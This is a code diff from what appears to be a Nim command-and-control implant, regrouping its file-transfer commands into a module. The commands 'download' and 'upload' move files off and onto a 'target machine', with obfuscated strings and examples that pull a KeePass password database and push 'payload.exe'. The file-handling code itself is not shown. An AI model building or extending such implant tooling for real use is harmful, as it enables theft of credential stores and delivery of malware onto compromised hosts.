@@ -4,30 +4,33 @@ import ../common/[types, utils]
 proc executeDownload(ctx: AgentCtx, task: Task): TaskResult
 proc executeUpload(ctx: AgentCtx, task: Task): TaskResult
 
-
-# Command definition (as seq[Command])
-let commands*: seq[Command] =  @[
-    Command(
-        name: protect("download"),
-        commandType: CMD_DOWNLOAD,
-        description: protect("Download a file."),
-        example: protect("download C:\\Users\\john\\Documents\\Database.kdbx"),
-        arguments: @[
-            Argument(name: protect("file"), description: protect("Path to file to download from the target machine."), argumentType: STRING, isRequired: true),
-        ],
-        execute: executeDownload
-    ),
-    Command(
-        name: protect("upload"),
-        commandType: CMD_UPLOAD,
-        description: protect("Upload a file."),
-        example: protect("upload /path/to/payload.exe"),
-        arguments: @[
-            Argument(name: protect("file"), description: protect("Path to file to upload to the target machine."), argumentType: BINARY, isRequired: true),
-        ],
-        execute: executeUpload
-    )
-]
+# Module definition
+let module* = Module(
+    name: protect("filetransfer"), 
+    description: protect("Upload/download files to/from the target system."),
+    commands: @[
+        Command(
+            name: protect("download"),
+            commandType: CMD_DOWNLOAD,
+            description: protect("Download a file."),
+            example: protect("download C:\\Users\\john\\Documents\\Database.kdbx"),
+            arguments: @[
+                Argument(name: protect("file"), description: protect("Path to file to download from the target machine."), argumentType: STRING, isRequired: true),
+            ],
+            execute: executeDownload
+        ),
+        Command(
+            name: protect("upload"),
+            commandType: CMD_UPLOAD,
+            description: protect("Upload a file."),
+            example: protect("upload /path/to/payload.exe"),
+            arguments: @[
+                Argument(name: protect("file"), description: protect("Path to file to upload to the target machine."), argumentType: BINARY, isRequired: true),
+            ],
+            execute: executeUpload
+        )
+    ]
+)
 
 # Implement execution functions
 when defined(server):
